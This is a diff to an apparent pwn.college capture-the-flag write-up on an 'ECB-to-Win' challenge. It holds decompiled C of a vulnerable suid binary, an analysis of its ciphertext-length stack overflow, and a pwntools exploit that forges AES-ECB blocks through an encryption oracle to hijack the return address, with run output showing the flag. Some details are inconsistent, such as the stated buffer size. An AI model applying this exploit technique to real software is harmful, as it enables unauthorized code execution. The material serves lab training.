@@ -125,12 +125,12 @@ void print_disassembly(void *shellcode_addr, size_t shellcode_size)
 void win()
 {
     static char flag[256];
-    static int flag_fd;
+    static int flag_file;
     static int flag_length;
 
     puts("You win! Here is your flag:");
-    flag_fd = open("/flag", 0);
-    if (flag_fd < 0)
+    flag_file = open("/flag", 0);
+    if (flag_file < 0)
     {
         printf("\n  ERROR: Failed to open the flag -- %s!\n", strerror(errno));
         if (geteuid() != 0)
@@ -140,7 +140,7 @@ void win()
         }
         exit(-1);
     }
-    flag_length = read(flag_fd, flag, sizeof(flag));
+    flag_length = read(flag_file, flag, sizeof(flag));
     if (flag_length <= 0)
     {
         printf("\n  ERROR: Failed to read the flag -- %s!\n", strerror(errno));
@@ -335,30 +335,33 @@ def get_encrypted_block(payload_bytes):
 
 print("[*] Harvesting ciphertext blocks from the ECB encryption oracle...")
 
-# 1. AES block 0 (Offsets 0-15) - "VERIFIED" header and length
-cipher_sample = get_encrypted_block(b"A")
-header_block = cipher_sample[0:16]
+# 1. AES block 0 - "VERIFIED" header and length (16 bytes)
+sample_cipher = get_encrypted_block(b"A")
+header_block = sample_cipher[0:16]
 
-# 2. AES block 1-6 (Offsets 16-111) - Padding
-cipher_padding = get_encrypted_block(b"A" * 96)
-overflow_padding = cipher_padding[16:112] 
+# 2. AES block 1-6 - Padding (16 * 6 = 96 bytes)
+padding_block = sample_cipher[16:32]
+padding = padding_block * 6             
 
-# 3. AES block 7 (Offsets 112-127) - Return address payload
+# 3. AES block 7 - Return address payload (8 * 8 = 16 bytes)
 win_addr_block = b"B" * 8 
 win_addr_block += p64(win_addr)
-cipher_payload = get_encrypted_block(win_addr_block)
-return_address_block = cipher_payload[16:32]
+return_addr_cipher = get_encrypted_block(win_addr_block)
+return_address_block = return_addr_cipher[16:32]
 
-# 4. Final AES block - PKCS7 padding
-padding_suffix = cipher_sample[-16:]
+# 4. Final AES block - PKCS7 padding (16 bytes)
+padding_suffix = sample_cipher[-16:]
 
 # Craft payload
-final_ciphertext = header_block + overflow_padding + return_address_block + padding_suffix
+payload = header_block 
+payload += padding 
+payload += return_address_block 
+payload += padding_suffix
 
 # 5. Pass payload
-print(f"[*] Dispatching assembled ciphertext ({len(final_ciphertext)} bytes) to target...")
+print(f"[*] Dispatching assembled ciphertext ({len(payload)} bytes) to target...")
 p = process('/challenge/vulnerable-overflow')
-p.send(final_ciphertext)
+p.send(payload)
 
 p.interactive()
 ```
@@ -415,6 +418,11 @@ $
 
 ## ECB-to-Win (Hard)
 
+```
+hacker@integrated-security~ecb-to-win-hard:~$ ls /challenge/
+dispatch  vulnerable-overflow
+```
+
 ### Binary Analysis
 
 ```c title="/challenge/dispatch" showLineNumbers
@@ -445,4 +453,302 @@ ciphertext = cipher.encrypt(
 )
 
 sys.stdout.buffer.write(ciphertext)
+```
+
+The `/challenge/dispatch` input we provide, the dispatcher prepends the `"VERIFIED"` header along with the `length`.
+
+```c title="/challenge/vulnerable-overflow" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  challenge((unsigned int)argc, argv, envp);
+  return 0;
+}
+```
+
+Let's look at the `challenge()` function.
+
+```c title="/challenge/vulnerable-overflow" showLineNumbers
+int challenge()
+{
+  __int64 EVP_aes_128_ecb; // rax
+  __int64 EVP_aes_128_ecb_1; // rax
+  int decrypted_len; // [rsp+2Ch] [rbp-84h] BYREF
+  __int64 plaintext_header; // [rsp+30h] [rbp-80h] BYREF
+  unsigned __int64 plaintext_len; // [rsp+38h] [rbp-78h]
+  __int64 plaintext_message[8]; // [rsp+40h] [rbp-70h] BYREF
+  char key[24]; // [rsp+80h] [rbp-30h] BYREF
+  unsigned __int64 ciphertext_len; // [rsp+98h] [rbp-18h]
+  void *ciphertext; // [rsp+A0h] [rbp-10h]
+  int key_file; // [rsp+ACh] [rbp-4h]
+
+  plaintext_header = 0LL;
+  plaintext_len = 0LL;
+  memset(plaintext_message, 0, 56);
+  key_file = open("/challenge/.key", 0);
+  if ( !key_file )
+    __assert_fail("key_file", "/challenge/vulnerable-overflow.c", 70u, "challenge");
+  if ( read(key_file, key, 16uLL) != 16 )
+    __assert_fail("read(key_file, key, 16) == 16", "/challenge/vulnerable-overflow.c", 71u, "challenge");
+  ctx = EVP_CIPHER_CTX_new();
+  EVP_aes_128_ecb = ::EVP_aes_128_ecb();
+  EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb, 0LL, key, 0LL);
+  close(key_file);
+  ciphertext = malloc(4096uLL);
+  ciphertext_len = read(0, ciphertext, 4096uLL);
+  if ( (ciphertext_len & 15) != 0 )
+    __assert_fail("ciphertext_len % 16 == 0", "/challenge/vulnerable-overflow.c", 78u, "challenge");
+  if ( ciphertext_len <= 15 )
+    __assert_fail("ciphertext_len >= 16", "/challenge/vulnerable-overflow.c", 79u, "challenge");
+  EVP_CIPHER_CTX_set_padding(ctx, 0LL);
+  EVP_DecryptUpdate(ctx, &plaintext_header, &decrypted_len, ciphertext, 16LL);
+  if ( memcmp(&plaintext_header, "VERIFIED", 8uLL) )
+    __assert_fail(
+      "memcmp(plaintext.header, \"VERIFIED\", 8) == 0",
+      "/challenge/vulnerable-overflow.c",
+      0x56u,
+      "challenge");
+  if ( plaintext_len > 16 )
+    __assert_fail("plaintext.length <= 16", "/challenge/vulnerable-overflow.c", 87u, "challenge");
+  ctx = EVP_CIPHER_CTX_new();
+  EVP_aes_128_ecb_1 = ::EVP_aes_128_ecb();
+  EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb_1, 0LL, key, 0LL);
+  memset(key, 0, 16uLL);
+  EVP_DecryptUpdate(
+    ctx,
+    plaintext_message,
+    &decrypted_len,
+    (char *)ciphertext + 16,
+    (unsigned int)(ciphertext_len - 16));
+  EVP_DecryptFinal_ex(ctx, (char *)plaintext_message + decrypted_len, &decrypted_len);
+  return printf("Decrypted message: %s!\n", (const char *)plaintext_message);
+}
+```
+
+We can see that the challenge defines a struct, within which the first 8 bytes are allocated to the `header`, the next 8 are allocated to the `length`, and then `56` bytes are allocated to `plaintext_message`.
+
+The `plaintext_message` buffer is located at `rbp-0x70`, which means it is at an offset of `120` bytes from the stored return address.
+
+```c showLineNumbers
+# ---- snip ----
+
+  __int64 plaintext_message[8]; // [rsp+40h] [rbp-70h] BYREF
+
+# ---- snip ----
+
+  plaintext_header = 0LL;
+  plaintext_len = 0LL;
+  memset(plaintext_message, 0, 56);
+
+# ---- snip ----
+```
+
+It allocates 4096 bytes for the user provided ciphertext, and uses `ciphertext_len` gives the length of the user provided input.
+It then ensures that `ciphertext_len >= 16` i.e. there is at least one block so that decryption can be performed.
+
+```c showLineNumbers
+# ---- snip ----
+
+  ciphertext = malloc(4096uLL);
+  ciphertext_len = read(0, ciphertext, 4096uLL);
+  if ( (ciphertext_len & 15) != 0 )
+    __assert_fail("ciphertext_len % 16 == 0", "/challenge/vulnerable-overflow.c", 78u, "challenge");
+  if ( ciphertext_len <= 15 )
+    __assert_fail("ciphertext_len >= 16", "/challenge/vulnerable-overflow.c", 79u, "challenge");
+
+# ---- snip ----
+```
+
+It then decrypts the first block of user provided ciphertext, places the resultant plaintext in the buffer defined before, and extracts the `plaintext_header` and `plaintext_length`. The challenge then checks if `plaintext_header == "VERIFIED"`, and `plaintext_length <= 16`, if not, it exits.
+
+```c showLineNumbers
+# ---- snip ----
+
+  key_file = open("/challenge/.key", 0);
+  if ( !key_file )
+    __assert_fail("key_file", "/challenge/vulnerable-overflow.c", 70u, "challenge");
+  if ( read(key_file, key, 16uLL) != 16 )
+    __assert_fail("read(key_file, key, 16) == 16", "/challenge/vulnerable-overflow.c", 71u, "challenge");
+  ctx = EVP_CIPHER_CTX_new();
+
+# ---- snip ----
+
+  EVP_CIPHER_CTX_set_padding(ctx, 0LL);
+  EVP_DecryptUpdate(ctx, &plaintext_header, &decrypted_len, ciphertext, 16LL);
+  if ( memcmp(&plaintext_header, "VERIFIED", 8uLL) )
+    __assert_fail(
+      "memcmp(plaintext.header, \"VERIFIED\", 8) == 0",
+      "/challenge/vulnerable-overflow.c",
+      0x56u,
+      "challenge");
+  if ( plaintext_len > 16 )
+    __assert_fail("plaintext.length <= 16", "/challenge/vulnerable-overflow.c", 87u, "challenge");
+
+# ---- snip ----
+```
+
+Then, it goes on to decrypt the rest of the ciphertext (`(char *)ciphertext + 16`), and stores it into `plaintext_message`.
+The problem here is that it uses `ciphertext_len - 16` here to assert the length of data to be decrypted instead of using the earlier defined `plaintext.length`. Since `ciphertext_len` is entirely controlled by the user input, we can send a message of any arbitrary size, which will be then stored into `plaintext.message` which is only 42 bytes long, thus overflowing it.
+
+```c showLineNumbers
+# ---- snip ----
+
+  ctx = EVP_CIPHER_CTX_new();
+  EVP_aes_128_ecb_1 = ::EVP_aes_128_ecb();
+  EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb_1, 0LL, key, 0LL);
+  memset(key, 0, 16uLL);
+  EVP_DecryptUpdate(
+    ctx,
+    plaintext_message,
+    &decrypted_len,
+    (char *)ciphertext + 16,
+    (unsigned int)(ciphertext_len - 16));
+  EVP_DecryptFinal_ex(ctx, (char *)plaintext_message + decrypted_len, &decrypted_len);
+
+# ---- snip ----
+```
+
+Finally, let's look at the `win()` function.
+
+```c title="/challenge/vulnerable-overflow" showLineNumbers
+int win()
+{
+  int *v0; // rax
+  char *error_msg; // rax
+  int *v2; // rax
+  char *error_msg_1; // rax
+
+  puts("You win! Here is your flag:");
+  flag_file = open("/flag", 0);
+  if ( flag_file < 0 )
+  {
+    v0 = __errno_location();
+    error_msg = strerror(*v0);
+    printf("\n  ERROR: Failed to open the flag -- %s!\n", error_msg);
+    if ( geteuid() )
+    {
+      puts("  Your effective user id is not 0!");
+      puts("  You must directly run the suid binary in order to have the correct permissions!");
+    }
+    exit(-1);
+  }
+  flag_length = read(flag_file, &flag_buf, 0x100uLL);
+  if ( flag_length <= 0 )
+  {
+    v2 = __errno_location();
+    error_msg_1 = strerror(*v2);
+    printf("\n  ERROR: Failed to read the flag -- %s!\n", error_msg_1);
+    exit(-1);
+  }
+  write(1, &flag_buf, flag_length);
+  return puts("\n");
+}
+```
+
+We also need the address of the `win()` function.
+
+```
+pwndbg> info address win
+Symbol "win" is at 0x4018f7 in a file compiled without debugging.
+```
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+# Initialize values
+win_addr = 0x4018f7  
+
+def get_encrypted_block(payload_bytes):
+    """
+    Interacts with the AES-ECB encryption oracle (dispatcher).
+    Returns the raw ciphertext generated using the hidden system key.
+    """
+    io = process('/challenge/dispatch', level='error')
+    io.send(payload_bytes) 
+    ciphertext = io.readall()
+    io.close()
+    return ciphertext
+
+print("[*] Harvesting ciphertext blocks from the ECB encryption oracle...")
+
+# 1. AES block 0 - "VERIFIED" header and length (16 bytes)
+sample_cipher = get_encrypted_block(b"A")
+header_block = sample_cipher[0:16]
+
+# 2. AES block 1-6 - Padding (16 * 6 = 96 bytes)
+padding_block = sample_cipher[16:32]
+padding = padding_block * 6          
+
+# 3. AES block 7 - Return address payload (8 * 8 = 16 bytes)
+win_addr_block = b"B" * 8 
+win_addr_block += p64(win_addr)
+return_addr_cipher = get_encrypted_block(win_addr_block)
+return_address_block = return_addr_cipher[16:32]
+
+# 4. Final AES block - PKCS7 padding (16 bytes)
+padding_suffix = sample_cipher[-16:]
+
+# Craft payload
+payload = header_block 
+payload += padding 
+payload += return_address_block 
+payload += padding_suffix
+
+# 5. Pass payload
+print(f"[*] Dispatching assembled ciphertext ({len(payload)} bytes) to target...")
+p = process('/challenge/vulnerable-overflow')
+p.send(payload)
+
+p.interactive()
+```
+
+```
+hacker@integrated-security~ecb-to-win-easy:~$ python ~/script.py 
+[*] Harvesting ciphertext blocks from the ECB encryption oracle...
+[*] Dispatching assembled ciphertext (144 bytes) to target...
+[+] Starting local process '/challenge/vulnerable-overflow': pid 12954
+[*] Switching to interactive mode
+Your message header: VERIFIED\x01
+Your message length: 1
+Decrypted message: A\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fBBBBBBBB\xf7\x18@!
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007fff82037f60 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff82037f68 (rsp+0x0008) | 38 81 03 82 ff 7f 00 00 | 0x00007fff82038138 |
+| 0x00007fff82037f70 (rsp+0x0010) | 28 81 03 82 ff 7f 00 00 | 0x00007fff82038128 |
+| 0x00007fff82037f78 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
+| 0x00007fff82037f80 (rsp+0x0020) | ff ff ff ff 00 00 00 00 | 0x00000000ffffffff |
+| 0x00007fff82037f88 (rsp+0x0028) | a0 e6 d3 4a 01 00 00 00 | 0x000000014ad3e6a0 |
+| 0x00007fff82037f90 (rsp+0x0030) | 56 45 52 49 46 49 45 44 | 0x4445494649524556 |
+| 0x00007fff82037f98 (rsp+0x0038) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
+| 0x00007fff82037fa0 (rsp+0x0040) | 41 0f 0f 0f 0f 0f 0f 0f | 0x0f0f0f0f0f0f0f41 |
+| 0x00007fff82037fa8 (rsp+0x0048) | 0f 0f 0f 0f 0f 0f 0f 0f | 0x0f0f0f0f0f0f0f0f |
+| 0x00007fff82037fb0 (rsp+0x0050) | 41 0f 0f 0f 0f 0f 0f 0f | 0x0f0f0f0f0f0f0f41 |
+| 0x00007fff82037fb8 (rsp+0x0058) | 0f 0f 0f 0f 0f 0f 0f 0f | 0x0f0f0f0f0f0f0f0f |
+| 0x00007fff82037fc0 (rsp+0x0060) | 41 0f 0f 0f 0f 0f 0f 0f | 0x0f0f0f0f0f0f0f41 |
+| 0x00007fff82037fc8 (rsp+0x0068) | 0f 0f 0f 0f 0f 0f 0f 0f | 0x0f0f0f0f0f0f0f0f |
+| 0x00007fff82037fd0 (rsp+0x0070) | 41 0f 0f 0f 0f 0f 0f 0f | 0x0f0f0f0f0f0f0f41 |
+| 0x00007fff82037fd8 (rsp+0x0078) | 0f 0f 0f 0f 0f 0f 0f 0f | 0x0f0f0f0f0f0f0f0f |
+| 0x00007fff82037fe0 (rsp+0x0080) | 41 0f 0f 0f 0f 0f 0f 0f | 0x0f0f0f0f0f0f0f41 |
+| 0x00007fff82037fe8 (rsp+0x0088) | 0f 0f 0f 0f 0f 0f 0f 0f | 0x0f0f0f0f0f0f0f0f |
+| 0x00007fff82037ff0 (rsp+0x0090) | 41 0f 0f 0f 0f 0f 0f 0f | 0x0f0f0f0f0f0f0f41 |
+| 0x00007fff82037ff8 (rsp+0x0098) | 0f 0f 0f 0f 0f 0f 0f 0f | 0x0f0f0f0f0f0f0f0f |
+| 0x00007fff82038000 (rsp+0x00a0) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007fff82038008 (rsp+0x00a8) | f7 18 40 00 00 00 00 00 | 0x00000000004018f7 |
++---------------------------------+-------------------------+--------------------+
+The program's memory status:
+- the input buffer starts at 0x7fff82037fa0
+[*] Process '/challenge/vulnerable-overflow' stopped with exit code -11 (SIGSEGV) (pid 12954)
+- the saved return address (previously to main) is at 0x7fff82038008
+- the address of win() is 0x4018f7.
+You win! Here is your flag:
+pwn.college{sBaSZzvEAX-48KsnbTM_0LFAcSD.QX3UDMxEDL4ITM0EzW}
+
+
+[*] Got EOF while reading in interactive
+$  
 ```
